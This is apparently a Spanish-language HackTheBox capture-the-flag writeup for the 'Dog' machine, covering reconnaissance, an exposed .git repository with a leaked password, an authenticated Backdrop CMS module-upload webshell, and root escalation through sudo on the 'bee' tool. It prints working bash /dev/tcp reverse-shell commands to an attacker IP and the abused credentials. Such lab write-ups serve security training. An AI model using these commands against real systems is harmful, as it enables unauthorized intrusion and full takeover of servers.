---
title: HackTheBox Dog Writeup
published: true
---


**Dog** es una máquina de dificultad *Easy* en HackTheBox que requiere explotar una vulnerabilidad en el servicio **Backdrop CMS**. 

Encontraremos un directorio `.git` que usaremos para obtener credenciales e iniciar sesión. Luego subiremos un módulo malicioso para obtener acceso inicial, y finalmente abusaremos de privilegios en el binario `bee` para conseguir una shell privilegiada.

-


![Captura de pantalla de la web](assets/images/Dog/imagen1.png)


# Reconocimiento

---


Comenzaremos realizando un escaneo que identifique puertos abiertos en la máquina víctima, por ahora solo contemplaremos el protocolo TCP/IPv4 :


```nmap
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.58 -oG openPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-29 14:58 EDT
Nmap scan report for 10.10.11.58
Host is up (0.33s latency).
Not shown: 60630 closed tcp ports (reset), 4903 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 18.85 seconds
```



Haremos un segundo escaneo a los puertos abiertos que hemos descubierto con el fin de identificar la versión y los servicios que se ejecutan en estos puertos :

-

```nmap
nmap -p 22,80 -sVC 10.10.11.58 -oN services                        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-29 14:58 EDT
Nmap scan report for 10.10.11.58
Host is up (0.30s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-title: Home | Dog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.80 seconds
```


Vemos dos servicios ssh y http. Todo indica que tendremos que explotar algún tipo de vulnerabilidad en la web, además de que nmap encuentra un repositorio expuesto.

-


# Web Analysis

---

Podemos realizar un escaneo de las tecnologías que utiliza el servidor web para mostrar el contenido de la web, como un CMS tipo Wordpress, Joomla, etc.

-


```shell
whatweb http://10.10.11.58                                           
http://10.10.11.58 [200 OK] Apache[2.4.41], Content-Language[en], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.58], UncommonHeaders[x-backdrop-cache,x-generator], X-Frame-Options[SAMEORIGIN]
```


Vemos que se emplea Backdrop CMS. Si visitamos la web en el navegador, veremos lo siguiente. ¡Un sitio de perritos!



![Captura de pantalla de la web](assets/images/Dog/imagen2.png)


# Fuzzing

---

Haremos solicitudes al servidor intentando descubrir rutas o archivos empleando un diccionario. Al igual que nmap, encontraremos un directorio .git al que tendremos acceso, entre otras rutas como `/files o /themes` :

-

```shell
gobuster dir -u http://dog.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dog.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git/HEAD            (Status: 200) [Size: 23]
/.git                 (Status: 301) [Size: 301] [--> http://dog.htb/.git/]
/.git/logs/           (Status: 200) [Size: 1126]
/.hta                 (Status: 403) [Size: 272]
/.htpasswd            (Status: 403) [Size: 272]
/.htaccess            (Status: 403) [Size: 272]
/.git/config          (Status: 200) [Size: 92]
/.git/index           (Status: 200) [Size: 344667]
/core                 (Status: 301) [Size: 301] [--> http://dog.htb/core/]
/files                (Status: 301) [Size: 302] [--> http://dog.htb/files/]
/index.php            (Status: 200) [Size: 13260]
/layouts              (Status: 301) [Size: 304] [--> http://dog.htb/layouts/]
/modules              (Status: 301) [Size: 304] [--> http://dog.htb/modules/]
/robots.txt           (Status: 200) [Size: 1198]
/server-status        (Status: 403) [Size: 272]
/sites                (Status: 301) [Size: 302] [--> http://dog.htb/sites/]
/themes               (Status: 301) [Size: 303] [--> http://dog.htb/themes/]
Progress: 4723 / 4724 (99.98%)
```


En la ruta /files, existe un directorio que guarda las configuraciones de Backdrop CMS, llamado `config_HASH`.


Es posible encontrar nombres de usuario en el archivo udpate.settings.json, en este caso, vemos el nombre de usuario tiffany en el campo `update_emails`.

-

```shell
curl http://dog.htb/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json

{
    "_config_name": "update.settings",
    "_config_static": true,
    "update_cron": 1,
    "update_disabled_extensions": 0,
    "update_interval_days": 0,
    "update_url": "",
    "update_not_implemented_url": "https://github.com/backdrop-ops/backdropcms.org/issues/22",
    "update_max_attempts": 2,
    "update_timeout": 30,
    "update_emails": [
        "tiffany@dog.htb"
    ],
    "update_threshold": "all",
    "update_requirement_type": 0,
    "update_status": [],
    "update_projects": []
}
```

# Intrusión / Explotación

---

###  Abusing Git Exposed Repository


> Una ruta `.git`, contiene toda la *historia*, **configuración** y ***estructura interna de un repositorio*** Git.

-

Con acceso a esta ruta, podremos reconstruir el repositorio y ver el historial de archivos, existe la posibilidad de encontrar credenciales o información sensible.

-

Utilizaremos herramientas como ``GitTools`` o el comando ``wget`` para descargar los archivos expuestos del repositorio

```shell
./gitdumper.sh http://dog.htb/.git/ repo-files
```
-

Hemos creado un directorio repo-files, y dentro de éste se ubica el directorio `.git.` Si vemos las modificaciones que se han realizado en este repositorio, podremos darnos cuenta que se han eliminado los archivos.

```shell
cd repo-files
git status
```
-

Restauraremos los archivos al último `commit`, eliminando las modificaciones realizadas sin guardar.

```shell
git restore .
```
-

Al completar la restauración, veremos los archivos que habían sido borrados

```shell
ls -l 

total 60
drwxr-xr-x 1 root root   222 Jun 29 15:33 core
drwxr-xr-x 1 root root   146 Jun 29 15:33 files
-rwxr-xr-x 1 root root   578 Jun 29 15:33 index.php
drwxr-xr-x 1 root root    18 Jun 29 15:33 layouts
-rwxr-xr-x 1 root root 18092 Jun 29 15:33 LICENSE.txt
-rwxr-xr-x 1 root root  5285 Jun 29 15:33 README.md
-rwxr-xr-x 1 root root  1198 Jun 29 15:33 robots.txt
-rwxr-xr-x 1 root root 21732 Jun 29 15:33 settings.php
drwxr-xr-x 1 root root    36 Jun 29 15:33 sites
drwxr-xr-x 1 root root    18 Jun 29 15:33 themes
```

-

## Credentials Leakage

---

Si consultamos el archivo `settings.php`, veremos unas credenciales aparentemente válidas para conectarnos a una base da datos `mysql`.

```shell
<?php
/**
 * @file
 * Main Backdrop CMS configuration file.
 */

/**
 * Database configuration:
 *
 * Most sites can configure their database by entering the connection string
 * below. If using primary/replica databases or multiple connections, see the
 * advanced database documentation at
 * https://api.backdropcms.org/database-configuration
 */
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';
```
-

Aunque podríamos intentar utilizar estas credenciales para el usuario `tiffany`, probando la contraseña encontrada para iniciar sesión en el CMS obtendremos acceso de administración


```shell
tiffany:BackDropJ2024DS2024
```

-

![Captura de pantalla de la web](assets/images/Dog/imagen3.png)

-

#  Backdrop CMS 1.27.1 - Authenticated Remote Code Execution

---

Este fallo de seguridad permite a un usuario autenticado con permisos de administración dentro de `Backdrop CMS`, provocar una ejecución remota de comandos el el servidor.

- El atacante crea un módulo malicioso y lo comprime dentro de un archivo `.tar.gz`.

  - El módulo falso contiene un archivo `shell.php`, el cual actúa como una `webshell` básica, ejecutando comandos enviados a través de un parámetro vía URL.

- El módulo malicioso es cargado en Backdrop CMS a través del endpoint `/modules/install`.

- Una vez el módulo es instalado, el atacante puede ejecutar comandos en el archivo `/shell.php`, ubicado en la ruta `/modules/shell`.

-

Podemos encontrar un exploit público dentro de `exploitdb` que podemos utilizar como prueba de concepto. Ejecutaremos el exploit enviando la URL del servicio vulnerable como parámetro.


```shell
python3 exploit.py http://10.10.11.58

Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://10.10.11.58/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://10.10.11.58/modules/shell/shell.php

```

Nos dirigiremos a Functionality `>` Install New Modules `>` Manual Installation para iniciar la instalación. Cargaremos el archivo `.tgz` 

-

![Captura de pantalla de la web](assets/images/Dog/imagen4.png)

-

Una vez, cargado, debemos hacer clic en `Install` (obviamente) para instalar el módulo. Una vez se haya completado la instalación, podremos acceder a la `webshell` a través de la siguiente URL :



```shell
http://dog.htb/modules/shell/shell.php
```



> Es posible que se elimine el módulo, entonces debes volver a instalarlo. Te aconsejo volver atrás desde esta pestaña hasta la sección de instalación manual

-

![Captura de pantalla de la web](assets/images/Dog/imagen5.png)


Ejecutaremos una reverse shell que enviará una consola interactiva a nuestra máquina atacante :

> Recuerda iniciar un listener con netcat antes de ejecutar el siguiente comando en la web


```shell
bash -c 'bash -i >& /dev/tcp/10.10.14.98/4444 0>&1'
```


Una vez ejecutemos la reverse shell, recibiremos una consola como el usuario `www-data` :

```shell
nc -lvnp 4444            
listening on [any] 4444 ...
connect to [10.10.14.98] from (UNKNOWN) [10.10.11.58] 60466
whoami
www-data
```
-

# TTY Treatment

--- 

Haremos un pequeño tratamiento para obtener una consola más interactiva, debido a que si presionamos `Ctrl + C`, la shell se nos va pal carajo

```shell
script /dev/null -c bash
Script started, file is /dev/null
sh: 0: getcwd() failed: No such file or directory
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
www-data@dog:$ ^Z
[1]  + 249411 suspended  nc -lvnp 4444
root@parrot exploits # stty raw -echo; fg
[1]  + 249411 continued  nc -lvnp 4444
                                      reset xterm
www-data@dog:$ export TERM=xterm

```
-

Ajustaremos las proporciones de la terminal a las nuestras, en mi caso tengo 44 filas y 184 columnas, puedes comprobar esto con el comando `stty size`

```shell
www-data@dog:$ stty rows 44 columns 184
```

-

# Shell as johncusack

---

Si listamos los usuarios existentes en la máquina, veremos que existen los usuarios `johncusack` y `jobert` 

```shell
www-data@dog:/var/www/html/modules/shell$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
```

-

La contraseña que habíamos encontrado para entrar al CMS como `tiffany` nos permitirán conectarnos como `johncusack` por el servicio `ssh` :

```shell
ssh johncusack@10.10.11.58
```

En este punto ya podemos ver la flag del usuario sin privilegios

```shell
johncusack@dog:~$ cat user.txt 
51a...
```
-


# Escalada de Privilegios

---

## Abusing bee for Backdrop CMS - Sudoers Privileges

Bee es una utilidad de línea de comandos para `Backdrop CMS`. Incluye comandos que permite interactuar con los sitios `Backdrop`, realizando acciones como:

-

- Ejecutar tareas cron
- Limpiar cachés
- Descargar e instalar Backdrop
- Descargar, habilitar y deshabilitar proyectos
- Ver información sobre un sitio y/o proyectos disponibles.

-

Listando los privilegios configurados en `/etc/sudoers`, podemos ver que el usuario `johncusack` puede ejecutar esta utilidad como `root` :



```shell
johncusack@dog:~$ sudo -l
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

-


# Root Time

---

Existe una forma de ejecutar comandos a nivel de sistema utilizando la opción `eval`, construiremos un comando que envíe una consola a nuestra máquina atacante, pero al ejecutarlo con sudo, la enviaremos como el usuario `root`

```shell
johncusack@dog:~$ sudo bee --root=/var/www/html/ eval "system('bash -c \'bash -i >& /dev/tcp/10.10.14.98/4444 0>&1\'');"

```

Antes de ejecutar el comando anterior, debemos iniciar un listener con `netcat`, donde en mi caso he elegido el puerto 4444

```shell
nc -lvnp 4444                                                                 
listening on [any] 4444 ...

```

Al ejecutar la `reverse shell`, en nuestro listener deberíamos recibir la consola como `root`

```shell
nc -lvnp 4444                                                                 
listening on [any] 4444 ...
connect to [10.10.14.98] from (UNKNOWN) [10.10.11.58] 51806
root@dog:/var/www/html# id    
id
uid=0(root) gid=0(root) groups=0(root)
```

Podemos hacer un nuevo tratamiento de la TTY para poder operar con una consola más interactiva que nos permita hacer `Ctrl + C y Ctrl + L` para limpiar la pantalla :

```shell
root@dog:/var/www/html# script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
root@dog:/var/www/html# ^Z
[1]  + 145213 suspended  nc -lvnp 4444
root@parrot exploits # stty raw -echo; fg
[1]  + 145213 continued  nc -lvnp 4444
                                      reset xterm

```
-

Solamente nos faltaría ver la última flag ubicada en el directorio `/root`

```shell
root@dog:/var/www/html# cat /root/root.txt 
cat /root/root.txt
55c...
```

